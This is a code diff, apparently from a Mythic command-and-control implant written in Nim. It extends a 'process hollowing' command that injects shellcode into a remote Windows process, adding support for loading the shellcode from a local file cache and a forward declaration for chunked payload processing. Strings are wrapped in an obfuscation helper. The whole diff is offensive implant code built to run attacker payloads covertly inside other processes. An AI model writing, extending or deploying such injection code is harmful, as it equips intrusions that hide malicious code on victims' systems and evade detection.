@@ -294,10 +294,29 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
 
 proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode
 
+# Forward declaration
+proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: string, 
+                               totalChunks: int, currentChunk: int, 
+                               fileData: var seq[byte]): JsonNode
+
 proc injectHollow*(taskId: string, params: JsonNode): JsonNode =
   ## Inject shellcode into a remote process using process hollowing
   when defined(windows):
     try:
+      # Check if using cached file first (no uuid needed)
+      if params.hasKey(obf("cached")):
+        let cachedName = params[obf("cached")].getStr()
+        let cachedData = getCachedFile(cachedName)
+        if cachedData.len == 0:
+          return mythicError(taskId, obf("File not found in cache. Use register_file first: ") & cachedName)
+        # Build params with dummy uuid for downstream parsing
+        var cachedParams = copy(params)
+        if not cachedParams.hasKey(obf("uuid")):
+          cachedParams[obf("uuid")] = %""
+        var fileData = cachedData
+        return processInjectHollowChunk(taskId, cachedParams, "", 1, 1, fileData)
+      
+      # Non-cached: parse full args (uuid required)
       let args = to(params, InjectHollowArgs)
       
       debug &"[DEBUG] Inject hollow: {args.shellcode_name}"
